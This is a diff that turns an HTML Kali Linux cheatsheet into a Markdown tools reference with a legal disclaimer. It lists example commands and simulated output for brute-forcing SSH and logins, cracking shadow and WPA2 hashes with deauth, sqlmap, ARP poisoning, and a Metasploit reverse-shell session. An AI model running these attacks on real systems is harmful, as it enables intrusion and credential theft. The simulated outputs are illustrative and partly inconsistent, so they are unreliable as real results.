@@ -1,319 +1,655 @@
-       <span class="fl">-L</span>   Username list file
-<span class="fl">-p</span>   Single password           <span class="fl">-P</span>   Password list file
-<span class="fl">-t</span>   Parallel threads (16)     <span class="fl">-V</span>   Verbose — show each attempt
-<span class="fl">-f</span>   Stop after first hit      <span class="fl">-o</span>   Save results to file</pre>
-    </div>
-  </section>
+# 🛡️ Kali Linux / Linux / Networking / Cybersecurity Tools Reference
 
-  <!-- ══════════════ 06 · JOHN ══════════════ -->
-  <section class="tool-section" id="john">
-    <div class="tool-header">
-      <span class="tool-number">06</span>
-      <span class="tool-icon">🔓</span>
-      <span class="tool-name">JOHN THE <span>RIPPER</span></span>
-      <span class="tool-badge badge-hash">HASH CRACKER</span>
-    </div>
-    <div class="install-line">INSTALL → <code>sudo apt install john</code></div>
+> ⚠️ **Legal Disclaimer**: All tools must be used **only on systems you own or have explicit written permission to test**. Unauthorized access is a criminal offence under the Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, and equivalent laws worldwide.
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">CRACKING HASHES</span>
-      </div>
-      <pre><span class="cmd">john</span> hashes.txt                              <span class="c"># Auto-detect format</span>
-<span class="cmd">john</span> <span class="fl">--wordlist=</span>/usr/share/wordlists/rockyou.txt hashes.txt
+---
 
-<span class="c"># Format-specific</span>
-<span class="cmd">john</span> <span class="fl">--format=</span><span class="kw">md5</span>    hashes.txt
-<span class="cmd">john</span> <span class="fl">--format=</span><span class="kw">sha256</span> hashes.txt
-<span class="cmd">john</span> <span class="fl">--format=</span><span class="kw">bcrypt</span> hashes.txt
-<span class="cmd">john</span> <span class="fl">--format=</span><span class="kw">NT</span>     hashes.txt  <span class="c"># Windows NTLM</span></pre>
-    </div>
+## 📋 Table of Contents
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">LINUX / ZIP / RAR</span>
-      </div>
-      <pre><span class="c"># ── Linux Shadow File ──────────────────────</span>
-<span class="cmd">unshadow</span> /etc/passwd /etc/shadow <span class="op">&gt;</span> combined.txt
-<span class="cmd">john</span> combined.txt
+1. [Information Gathering / Reconnaissance](#1-information-gathering--reconnaissance)
+2. [Network Scanning & Enumeration](#2-network-scanning--enumeration)
+3. [Vulnerability Assessment](#3-vulnerability-assessment)
+4. [Web Application Security](#4-web-application-security)
+5. [Wireless Security / Wi-Fi Hacking](#5-wireless-security--wi-fi-hacking)
+6. [Password Attacks](#6-password-attacks)
+7. [Exploitation Frameworks](#7-exploitation-frameworks)
+8. [Sniffing & Packet Analysis](#8-sniffing--packet-analysis)
+9. [Digital Forensics](#9-digital-forensics)
+10. [Reverse Engineering](#10-reverse-engineering)
+11. [Linux System Monitoring & Admin](#11-linux-system-monitoring--admin)
+12. [Networking Tools](#12-networking-tools)
+13. [Malware Analysis](#13-malware-analysis)
+14. [Containers / Cloud / DevSecOps](#14-containers--cloud--devsecops)
+15. [Programming & Scripting](#15-programming--scripting)
+16. [Learning Roadmap](#-learning-roadmap)
 
-<span class="c"># ── Protected ZIP ──────────────────────────</span>
-<span class="cmd">zip2john</span> protected.zip <span class="op">&gt;</span> zip.hash
-<span class="cmd">john</span> zip.hash <span class="fl">--wordlist=</span>rockyou.txt
+---
 
-<span class="c"># ── Protected RAR ──────────────────────────</span>
-<span class="cmd">rar2john</span> protected.rar <span class="op">&gt;</span> rar.hash
-<span class="cmd">john</span> rar.hash <span class="fl">--wordlist=</span>rockyou.txt
+## 1. Information Gathering / Reconnaissance
 
-<span class="c"># ── Show results ───────────────────────────</span>
-<span class="cmd">john</span> <span class="fl">--show</span> hashes.txt
+**Used for:** Collecting target information, finding domains, IPs, emails, DNS records, and open-source intelligence (OSINT).
 
-<span class="c"># ── Mutation rules ─────────────────────────</span>
-<span class="cmd">john</span> <span class="fl">--wordlist=</span>rockyou.txt <span class="fl">--rules</span> hashes.txt</pre>
-    </div>
-  </section>
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **Nmap** | Network mapper — port scan + OS/service detection | `nmap -sV -sC -O -p- 192.168.1.1` |
+| **theHarvester** | Email, subdomain, IP OSINT from public sources | `theHarvester -d target.com -b all` |
+| **Recon-ng** | Modular OSINT framework (like Metasploit for recon) | `recon-ng -w workspace` |
+| **Maltego** | Visual link analysis for relationships between entities | GUI-based |
+| **Amass** | In-depth DNS enumeration and subdomain discovery | `amass enum -d target.com` |
+| **Sublist3r** | Fast subdomain enumeration using search engines | `sublist3r -d target.com` |
+| **Shodan** | Search engine for internet-connected devices | `shodan search apache country:IN` |
+| **SpiderFoot** | Automated OSINT across 200+ data sources | `spiderfoot -s target.com -t all` |
+| **DNSRecon** | DNS record enumeration and zone transfers | `dnsrecon -d target.com -t axfr` |
+| **Whois** | Domain registration details | `whois target.com` |
+| **Netdiscover** | ARP-based host discovery on local networks | `netdiscover -r 192.168.1.0/24` |
 
-  <!-- ══════════════ 07 · HASHCAT ══════════════ -->
-  <section class="tool-section" id="hashcat">
-    <div class="tool-header">
-      <span class="tool-number">07</span>
-      <span class="tool-icon">⚡</span>
-      <span class="tool-name">HASH<span>CAT</span></span>
-      <span class="tool-badge badge-hash">GPU CRACKER</span>
-    </div>
-    <div class="install-line">INSTALL → <code>sudo apt install hashcat</code></div>
+### 💻 Snapshot: Nmap Full Scan
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">HASH MODES (-m) REFERENCE</span>
-      </div>
-      <pre><span class="fl">-m</span> <span class="val">0</span>      MD5
-<span class="fl">-m</span> <span class="val">100</span>    SHA1
-<span class="fl">-m</span> <span class="val">1400</span>   SHA-256
-<span class="fl">-m</span> <span class="val">1800</span>   sha512crypt  <span class="c">(Linux $6$)</span>
-<span class="fl">-m</span> <span class="val">1000</span>   NTLM         <span class="c">(Windows)</span>
-<span class="fl">-m</span> <span class="val">3200</span>   bcrypt
-<span class="fl">-m</span> <span class="val">22000</span>  WPA2         <span class="c">(WiFi)</span></pre>
-    </div>
+```bash
+root@kali:~$ nmap -sV -sC -O -p- 192.168.1.1
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">ATTACK MODES (-a)</span>
-      </div>
-      <pre><span class="c"># Dictionary attack</span>
-<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span>    <span class="fl">-a</span> <span class="val">0</span> hash.txt rockyou.txt      <span class="c"># MD5 + wordlist</span>
-<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">1000</span> <span class="fl">-a</span> <span class="val">0</span> ntlm.txt rockyou.txt     <span class="c"># Windows NTLM</span>
+Starting Nmap 7.94 ( https://nmap.org )
+PORT     STATE  SERVICE   VERSION
+22/tcp   open   ssh       OpenSSH 8.2p1 Ubuntu
+80/tcp   open   http      Apache httpd 2.4.41
+443/tcp  open   https     nginx 1.18.0
+3306/tcp open   mysql     MySQL 5.7.33
 
-<span class="c"># Brute force with mask</span>
-<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span> <span class="fl">-a</span> <span class="val">3</span> hash.txt <span class="str">?d?d?d?d</span>          <span class="c"># 4-digit PIN</span>
-<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span> <span class="fl">-a</span> <span class="val">3</span> hash.txt <span class="str">?u?l?l?l?d?d?d?d</span>  <span class="c"># Upper+lower+digits</span>
+OS Details: Linux 4.15 - 5.6
+Nmap done: 1 IP scanned in 23.4 seconds
+```
 
-<span class="c"># Mask charset key:</span>
-<span class="c"># ?l = lowercase   ?u = uppercase   ?d = digit   ?s = special   ?a = all</span>
+### 💻 Snapshot: theHarvester OSINT
 
-<span class="c"># With rules</span>
-<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span> <span class="fl">-a</span> <span class="val">0</span> hash.txt rockyou.txt <span class="fl">-r</span> best64.rule
+```bash
+root@kali:~$ theHarvester -d target.com -b all
 
-<span class="c"># Show results</span>
-<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span> hash.txt <span class="fl">--show</span></pre>
-    </div>
-  </section>
+[*] Emails found:
+  admin@target.com
+  john.doe@target.com
+  support@target.com
 
-  <!-- ══════════════ 08 · AIRCRACK ══════════════ -->
-  <section class="tool-section" id="aircrack">
-    <div class="tool-header">
-      <span class="tool-number">08</span>
-      <span class="tool-icon">📶</span>
-      <span class="tool-name">AIRCRACK<span>-NG</span></span>
-      <span class="tool-badge badge-wifi">WIRELESS</span>
-    </div>
-    <div class="install-line">INSTALL → <code>sudo apt install aircrack-ng</code></div>
+[*] Hosts found:
+  mail.target.com - 104.21.3.x
+  dev.target.com  - 172.67.1.x
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">FULL WORKFLOW — WPA2 CAPTURE</span>
-      </div>
-      <pre><span class="c"># 1. Enable monitor mode</span>
-<span class="cmd">sudo airmon-ng check kill</span>       <span class="c"># Kill interfering processes</span>
-<span class="cmd">sudo airmon-ng start</span> wlan0      <span class="c"># → wlan0mon</span>
+[!] Shodan results: 3 hosts exposed to internet
+```
 
-<span class="c"># 2. Scan for networks</span>
-<span class="cmd">sudo airodump-ng</span> wlan0mon
+---
 
-<span class="c"># 3. Target & capture handshake</span>
-<span class="cmd">sudo airodump-ng</span> <span class="fl">-c</span> <span class="val">6</span> <span class="fl">--bssid</span> <span class="val">AA:BB:CC:DD:EE:FF</span> <span class="fl">-w</span> capture wlan0mon
+## 2. Network Scanning & Enumeration
 
-<span class="c"># 4. Force handshake via deauth</span>
-<span class="cmd">sudo aireplay-ng</span> <span class="fl">-0</span> <span class="val">10</span> <span class="fl">-a</span> <span class="val">AA:BB:CC:DD:EE:FF</span> wlan0mon
+**Used for:** Port scanning, service detection, SMB/SNMP enumeration, and vulnerability discovery.
 
-<span class="c"># 5. Crack the handshake</span>
-<span class="cmd">aircrack-ng</span> <span class="fl">-w</span> rockyou.txt <span class="fl">-b</span> <span class="val">AA:BB:CC:DD:EE:FF</span> capture-01.cap
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **Nmap** | Comprehensive port + service scanner | `nmap -sU -p 161 --script snmp-brute 10.0.0.1` |
+| **Masscan** | Extremely fast internet-scale port scanner | `masscan -p1-65535 10.0.0.0/8 --rate=10000` |
+| **RustScan** | Fast Rust-based scanner, pipes to Nmap | `rustscan -a 192.168.1.1 -- -sV` |
+| **Unicornscan** | Async stateless TCP/UDP scanner | `unicornscan -Iv 192.168.1.1:a` |
+| **Netcat** | TCP/UDP Swiss army knife | `nc -lvnp 4444` |
+| **Enum4linux** | SMB/Windows enumeration | `enum4linux -a 192.168.1.1` |
+| **SNMPwalk** | Query SNMP devices for information | `snmpwalk -v2c -c public 192.168.1.1` |
+| **SMBclient** | Access SMB shares interactively | `smbclient //192.168.1.1/share` |
+| **rpcclient** | Windows RPC enumeration | `rpcclient -U "" 192.168.1.1` |
 
-<span class="c"># 6. Stop monitor mode</span>
-<span class="cmd">sudo airmon-ng stop</span> wlan0mon</pre>
-    </div>
+### 💻 Snapshot: RustScan + Nmap
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">⚡ FASTER — HASHCAT + HCXTOOLS</span>
-      </div>
-      <pre><span class="cmd">hcxdumptool</span> <span class="fl">-i</span> wlan0mon <span class="fl">-o</span> capture.pcapng <span class="fl">--enable-status=</span><span class="val">1</span>
-<span class="cmd">hcxpcapngtool</span> <span class="fl">-o</span> hash.hc22000 capture.pcapng
-<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">22000</span> hash.hc22000 rockyou.txt</pre>
-    </div>
-  </section>
+```bash
+root@kali:~$ rustscan -a 192.168.1.1 -- -sV -sC
 
-  <!-- ══════════════ 09 · NIKTO ══════════════ -->
-  <section class="tool-section" id="nikto">
-    <div class="tool-header">
-      <span class="tool-number">09</span>
-      <span class="tool-icon">🕸️</span>
-      <span class="tool-name">NIK<span>TO</span></span>
-      <span class="tool-badge badge-web">WEB SCANNER</span>
-    </div>
-    <div class="install-line">INSTALL → <code>sudo apt install nikto</code></div>
+.----. .-. .-. .----..---. 
+| {}  }| { } |{ {__ {_ _}
+| .-. \| {_} |.-._} } | |
+`-' `-'`-----'`----'  `-'
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">SCANNING</span>
-      </div>
-      <pre><span class="cmd">nikto</span> <span class="fl">-h</span> http<span class="op">://</span><span class="val">192.168.1.10</span>                          <span class="c"># HTTP target</span>
-<span class="cmd">nikto</span> <span class="fl">-h</span> https<span class="op">://</span><span class="val">192.168.1.10</span>                         <span class="c"># HTTPS target</span>
-<span class="cmd">nikto</span> <span class="fl">-h</span> <span class="val">192.168.1.10</span> <span class="fl">-port</span> <span class="val">8080</span>                     <span class="c"># Non-default port</span>
-<span class="cmd">nikto</span> <span class="fl">-h</span> <span class="val">192.168.1.10</span> <span class="fl">-o</span> report.html <span class="fl">-Format</span> htm      <span class="c"># HTML report</span>
-<span class="cmd">nikto</span> <span class="fl">-h</span> <span class="val">192.168.1.10</span> <span class="fl">-useproxy</span> http<span class="op">://</span>127.0.0.1:8080 <span class="c"># Through Burp</span></pre>
-    </div>
+Open 192.168.1.1:22
+Open 192.168.1.1:80
+Open 192.168.1.1:8080
+[~] Starting Nmap...
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2
+80/tcp   open  http    Apache 2.4.41
+8080/tcp open  http    Tomcat 9.0.31
+```
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">TUNING FLAGS</span>
-      </div>
-      <pre><span class="fl">-Tuning 1</span>   XSS tests only
-<span class="fl">-Tuning 4</span>   Injection tests only
-<span class="fl">-ssl</span>        Force SSL
+---
 
-<span class="c"># Nikto checks for:</span>
-<span class="op">→</span> Outdated software versions
-<span class="op">→</span> Dangerous HTTP methods  <span class="c">(PUT, DELETE)</span>
-<span class="op">→</span> Default credentials
-<span class="op">→</span> Common exposed paths    <span class="c">(/admin, /backup, /config)</span>
-<span class="op">→</span> Missing security headers</pre>
-    </div>
-  </section>
+## 3. Vulnerability Assessment
 
-  <!-- ══════════════ 10 · GOBUSTER ══════════════ -->
-  <section class="tool-section" id="gobuster">
-    <div class="tool-header">
-      <span class="tool-number">10</span>
-      <span class="tool-icon">📂</span>
-      <span class="tool-name">GOBUS<span>TER</span></span>
-      <span class="tool-badge badge-web">FUZZER</span>
-    </div>
-    <div class="install-line">INSTALL → <code>sudo apt install gobuster</code></div>
+**Used for:** Detecting weaknesses, identifying CVEs, and auditing systems for security misconfigurations.
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">DIRECTORY & SUBDOMAIN ENUM</span>
-      </div>
-      <pre><span class="c"># Directory brute force</span>
-<span class="cmd">gobuster</span> dir <span class="fl">-u</span> http<span class="op">://</span><span class="val">192.168.1.10</span> <span class="fl">-w</span> /usr/share/wordlists/dirb/common.txt
-<span class="cmd">gobuster</span> dir <span class="fl">-u</span> http<span class="op">://</span><span class="val">192.168.1.10</span> <span class="fl">-w</span> common.txt <span class="fl">-x</span> php,html,txt,bak
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **OpenVAS** | Open-source vulnerability scanner (Greenbone) | GUI / `gvm-cli` |
+| **Nessus** | Industry-standard vulnerability assessment | GUI-based |
+| **Nikto** | Web server vulnerability scanner | `nikto -h http://target.com` |
+| **Lynis** | Linux system security auditing | `lynis audit system` |
+| **WPScan** | WordPress-specific vulnerability scanner | `wpscan --url http://target.com --enumerate u` |
+| **Nuclei** | Template-based fast vulnerability scanner | `nuclei -u https://target.com -t cves/` |
+| **Retire.js** | Detect outdated JavaScript libraries | `retire --path /var/www/html` |
 
-<span class="c"># Subdomain enumeration</span>
-<span class="cmd">gobuster</span> dns <span class="fl">-d</span> example.com <span class="fl">-w</span> subdomains-top1million-5000.txt
+### 💻 Snapshot: Nikto Web Scan
 
-<span class="c"># VHost discovery</span>
-<span class="cmd">gobuster</span> vhost <span class="fl">-u</span> http<span class="op">://</span>example.com <span class="fl">-w</span> subdomains.txt</pre>
-    </div>
+```bash
+root@kali:~$ nikto -h http://target.com
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">KEY FLAGS</span>
-      </div>
-      <pre><span class="fl">-u</span>   Target URL              <span class="fl">-w</span>   Wordlist path
-<span class="fl">-x</span>   File extensions         <span class="fl">-t</span>   Threads (default 10, use 50+)
-<span class="fl">-o</span>   Output file             <span class="fl">-k</span>   Skip TLS verification
-<span class="fl">-s</span>   Show status codes only  <span class="fl">-b</span>   Blacklist codes: <span class="str">-b 404,403</span>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ /admin/: Directory indexing enabled
++ /phpMyAdmin/: phpMyAdmin detected — default credentials may work
++ X-Frame-Options header missing
++ CVE-2017-12617: Apache Tomcat RCE via PUT method possible
++ /backup.zip: Backup file found!
+---------------------------------------------------------------------------
+7 items found | 3 critical | Scan time: 45s
+```
 
-<span class="c"># Install SecLists (essential wordlists)</span>
-<span class="cmd">sudo apt install seclists</span></pre>
-    </div>
-  </section>
+---
 
-  <!-- ══════════════ SUMMARY ══════════════ -->
-  <section class="tool-section" id="summary">
-    <div class="tool-header">
-      <span class="tool-number">★</span>
-      <span class="tool-icon">📋</span>
-      <span class="tool-name">QUICK <span>REFERENCE</span></span>
-    </div>
+## 4. Web Application Security
 
-    <div class="code-block">
-      <div class="code-header">
-        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
-        <span class="code-label">TOOL CHEATSHEET SUMMARY</span>
-      </div>
-      <table class="summary-table" style="width:100%">
-        <thead>
-          <tr>
-            <th>TOOL</th>
-            <th>CATEGORY</th>
-            <th>PRIMARY USE</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td class="tool-col">nmap</td>
-            <td><span class="tool-badge badge-net cat-pill">NETWORK</span></td>
-            <td>Network/port scanning, service & OS detection</td>
-          </tr>
-          <tr>
-            <td class="tool-col">wireshark</td>
-            <td><span class="tool-badge badge-net cat-pill">NETWORK</span></td>
-            <td>Packet capture, traffic analysis, credential sniffing</td>
-          </tr>
-          <tr>
-            <td class="tool-col">burpsuite</td>
-            <td><span class="tool-badge badge-web cat-pill">WEB APP</span></td>
-            <td>Web app testing, request interception & modification</td>
-          </tr>
-          <tr>
-            <td class="tool-col">metasploit</td>
-            <td><span class="tool-badge badge-exploit cat-pill">EXPLOIT</span></td>
-            <td>Exploitation framework, post-exploitation, pivoting</td>
-          </tr>
-          <tr>
-            <td class="tool-col">hydra</td>
-            <td><span class="tool-badge badge-exploit cat-pill">BRUTE FORCE</span></td>
-            <td>Online password brute forcing (SSH, FTP, HTTP…)</td>
-          </tr>
-          <tr>
-            <td class="tool-col">john</td>
-            <td><span class="tool-badge badge-hash cat-pill">HASH</span></td>
-            <td>Offline hash cracking, CPU — zip/rar/shadow files</td>
-          </tr>
-          <tr>
-            <td class="tool-col">hashcat</td>
-            <td><span class="tool-badge badge-hash cat-pill">HASH</span></td>
-            <td>Offline hash cracking, GPU-accelerated, masks & rules</td>
-          </tr>
-          <tr>
-            <td class="tool-col">aircrack-ng</td>
-            <td><span class="tool-badge badge-wifi cat-pill">WIRELESS</span></td>
-            <td>WiFi security testing, WPA2 handshake capture & crack</td>
-          </tr>
-          <tr>
-            <td class="tool-col">nikto</td>
-            <td><span class="tool-badge badge-web cat-pill">WEB SCAN</span></td>
-            <td>Web server vulnerability scanning, misconfigurations</td>
-          </tr>
-          <tr>
-            <td class="tool-col">gobuster</td>
-            <td><span class="tool-badge badge-web cat-pill">FUZZER</span></td>
-            <td>Directory brute force, subdomain & vhost enumeration</td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-  </section>
+**Used for:** Testing websites, finding SQLi/XSS vulnerabilities, fuzzing directories, and intercepting HTTP requests.
 
-</div>
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **Burp Suite** | Full web app security testing proxy | GUI-based |
+| **OWASP ZAP** | Free web application scanner | `zap-cli quick-scan http://target.com` |
+| **sqlmap** | Automated SQL injection detection/exploitation | `sqlmap -u "http://site.com/id=1" --dbs` |
+| **Gobuster** | Directory/file brute-forcing | `gobuster dir -u http://target.com -w common.txt` |
+| **Dirb** | Web content scanner | `dirb http://target.com /usr/share/dirb/wordlists/common.txt` |
+| **ffuf** | Fast web fuzzer (params, dirs, virtual hosts) | `ffuf -u http://target.com/FUZZ -w wordlist.txt` |
+| **Wfuzz** | Advanced web fuzzer | `wfuzz -c -z file,wordlist.txt http://target.com/FUZZ` |
+| **XSStrike** | Advanced XSS detection suite | `xsstrike -u "http://target.com/search?q=test"` |
+| **Commix** | Command injection exploiter | `commix --url="http://target.com/cmd.php?cmd=id"` |
+| **Hydra** | Online brute force (web forms, SSH, FTP, etc.) | `hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |
 
-<footer class="footer">
-  <span>"</span>A tool is only as good as the person wielding it.<span>"</span><br>
-  Understand what each command does — never blindly copy.<br><br>
-  Part of the Linux Cybersec Course · Use responsibly
-</footer>
+### 💻 Snapshot: sqlmap Database Dump
 
-</body>
-</html>
+```bash
+root@kali:~$ sqlmap -u "http://site.com/index.php?id=1" --dbs
+
+[*] testing connection to target URL
+[+] parameter 'id' is vulnerable!
+    Payload Type: UNION-based (4 columns)
+    Backend DBMS: MySQL >= 5.0
+
+[*] Available databases [3]:
+    [*] information_schema
+    [*] users_db
+    [*] admin_panel
+
+[*] Fetched data logged to /root/.sqlmap/output/
+```
+
+### 💻 Snapshot: Gobuster Directory Brute Force
+
+```bash
+root@kali:~$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+===============================================================
+Gobuster v3.5
+===============================================================
+/admin         (Status: 301) [Size: 312] [--> /admin/]
+/backup        (Status: 200) [Size: 1928354]
+/config.php    (Status: 200) [Size: 0]
+/login         (Status: 200) [Size: 4210]
+/uploads       (Status: 403) [Size: 276]
+===============================================================
+Progress: 4614/4614 (100%) | Time: 00:00:23
+```
+
+---
+
+## 5. Wireless Security / Wi-Fi Hacking
+
+**Used for:** Wi-Fi auditing, WPA/WPA2 testing, and capturing handshakes for offline cracking.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **Aircrack-ng** | WPA/WEP cracking suite | `aircrack-ng -b AA:BB:CC:DD -w rockyou.txt cap.pcap` |
+| **Kismet** | Wireless network detector and sniffer | `kismet -c wlan0` |
+| **Reaver** | WPS PIN brute-force attack | `reaver -i wlan0mon -b AA:BB:CC:DD -vv` |
+| **Wifite** | Automated Wi-Fi auditing | `wifite --wpa --dict rockyou.txt` |
+| **hcxdumptool** | Capture PMKID and EAPOL packets | `hcxdumptool -i wlan0 -o capture.pcapng` |
+| **Bettercap** | Advanced MITM and Wi-Fi attack framework | `bettercap -iface wlan0` |
+
+### 💻 Snapshot: Aircrack-ng WPA2 Attack
+
+```bash
+root@kali:~$ airmon-ng start wlan0           # Enable monitor mode
+root@kali:~$ airodump-ng wlan0mon            # Capture nearby APs
+root@kali:~$ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
+root@kali:~$ aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon   # Deauth
+root@kali:~$ aircrack-ng -b AA:BB:CC:DD:EE:FF -w rockyou.txt cap-01.cap
+
+[00:02:34] 148291 keys tested (1523.91 k/s)
+KEY FOUND! [ mypassword2023 ]
+
+Master Key     : AB CD EF 01 23 45 ...
+Transcient Key : 12 34 56 78 9A BC ...
+```
+
+---
+
+## 6. Password Attacks
+
+**Used for:** Hash cracking, brute force testing, password auditing, and wordlist generation.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **John the Ripper** | CPU-based hash cracker | `john --wordlist=rockyou.txt hashes.txt` |
+| **Hashcat** | GPU-accelerated hash cracking | `hashcat -m 0 hashes.txt rockyou.txt` |
+| **Hydra** | Online brute force over many protocols | `hydra -l admin -P rockyou.txt ssh://192.168.1.1` |
+| **Medusa** | Parallel brute force login tool | `medusa -h 192.168.1.1 -u admin -P rockyou.txt -M ssh` |
+| **CeWL** | Custom wordlist generator from websites | `cewl http://target.com -w wordlist.txt` |
+| **Crunch** | Wordlist generator with patterns | `crunch 8 8 abc123 -o wordlist.txt` |
+
+### 💻 Snapshot: Hashcat GPU Cracking
+
+```bash
+root@kali:~$ hashcat -m 0 hashes.txt rockyou.txt
+
+hashcat (v6.2.6) starting...
+Device #1: NVIDIA GeForce RTX 3080 - 10240MB
+
+Speed: 12500 MH/s
+
+5f4dcc3b5aa765d61d8327deb882cf99:password123
+d8578edf8458ce06fbc5bb76a58c5ca4:qwerty
+482c811da5d5b4bc6d497ffa98491e38:[ NOT FOUND ]
+
+Session..........: hashcat
+Status...........: Exhausted
+Recovered........: 2/3 (66.67%) Digests
+Time.Started.....: 00:01:23
+```
+
+### 💻 Snapshot: Hydra SSH Brute Force
+
+```bash
+root@kali:~$ hydra -l admin -P rockyou.txt ssh://192.168.1.1
+
+Hydra v9.4 starting...
+[DATA] 16 tasks, 1 server, 14344392 tries
+[DATA] attacking ssh://192.168.1.1:22/
+
+[22][ssh] host: 192.168.1.1   login: admin   password: letmein
+
+1 of 1 target successfully completed, 1 valid password found
+```
+
+---
+
+## 7. Exploitation Frameworks
+
+**Used for:** Exploiting known vulnerabilities, generating payloads, and post-exploitation activities.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **Metasploit Framework** | The most widely used exploitation framework | `msfconsole` |
+| **BeEF** | Browser Exploitation Framework | `beef-xss` |
+| **SearchSploit** | Offline Exploit-DB search | `searchsploit apache 2.4` |
+| **Empire** | PowerShell/Python post-exploitation C2 | `powershell-empire` |
+| **RouterSploit** | Router and embedded device exploitation | `rsf` |
+
+### 💻 Snapshot: Metasploit Meterpreter Session
+
+```bash
+root@kali:~$ msfconsole
+
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.0.0.1
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.0.0.1:4444
+[*] Sending stage (3020772 bytes) to 192.168.1.50
+[*] Meterpreter session 1 opened!
+
+meterpreter > sysinfo
+Computer     : victim-machine
+OS           : Linux 5.4.0 #1 SMP
+Architecture : x64
+
+meterpreter > getuid
+Server username: www-data
+
+meterpreter > shell
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### 💻 Snapshot: SearchSploit
+
+```bash
+root@kali:~$ searchsploit apache 2.4.41
+
+---------------------------------------------------
+ Exploit Title                    |  Path
+---------------------------------------------------
+ Apache 2.4.41 - RCE              | linux/remote/48370.py
+ Apache 2.4.41 - DoS              | linux/dos/48203.sh
+ Apache 2.4.x - Local Privilege   | linux/local/47138.c
+---------------------------------------------------
+
+root@kali:~$ searchsploit -m linux/remote/48370.py
+  Copied to: /root/48370.py
+```
+
+---
+
+## 8. Sniffing & Packet Analysis
+
+**Used for:** Network monitoring, packet inspection, protocol analysis, and MITM attacks.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **Wireshark** | GUI packet capture and protocol analyzer | `wireshark` |
+| **tcpdump** | CLI packet sniffer and filter | `tcpdump -i eth0 -n 'port 80' -A` |
+| **Ettercap** | ARP poisoning and MITM suite | `ettercap -T -M arp:remote /192.168.1.1// /192.168.1.5//` |
+| **dsniff** | Network credential sniffer | `dsniff -i eth0` |
+| **TShark** | CLI version of Wireshark | `tshark -r capture.pcap -Y http` |
+
+### 💻 Snapshot: tcpdump HTTP Capture
+
+```bash
+root@kali:~$ tcpdump -i eth0 -n 'port 80' -A
+
+Capturing on eth0, link-type EN10MB
+13:22:01 IP 192.168.1.5.52341 > 10.0.0.1.80: Flags [S]
+GET /admin/login HTTP/1.1
+Host: target.com
+Cookie: auth=bearer_token_abc123xyz
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)
+
+POST /login HTTP/1.1
+username=admin&password=P@ssw0rd123
+
+HTTP/1.1 302 Found
+Location: /dashboard
+Set-Cookie: session=abc123; Path=/; HttpOnly
+
+3 packets captured, 3 received, 0 dropped
+```
+
+---
+
+## 9. Digital Forensics
+
+**Used for:** Recovering digital evidence, disk analysis, memory dumps, and incident response.
+
+| Tool | Description | Example Command |
+|------|-------------|-----------------|
+| **Autopsy** | GUI-based digital forensics platform | GUI-based |
+| **Volatility** | Memory forensics framework | `volatility -f mem.raw --profile=Win10x64 pstree` |
+| **Foremost** | File carving from raw disk images | `foremost -i disk.img -o /output/` |
+| **Binwalk** | Firmware analysis and extraction | `binwalk -e firmware.bin` |
+| **Sleuth Kit** | Command-line forensic tools (fls, icat, etc.) | `fls -r disk.img` |
+
+### 💻 Snapshot: Volatility Memory Analysis
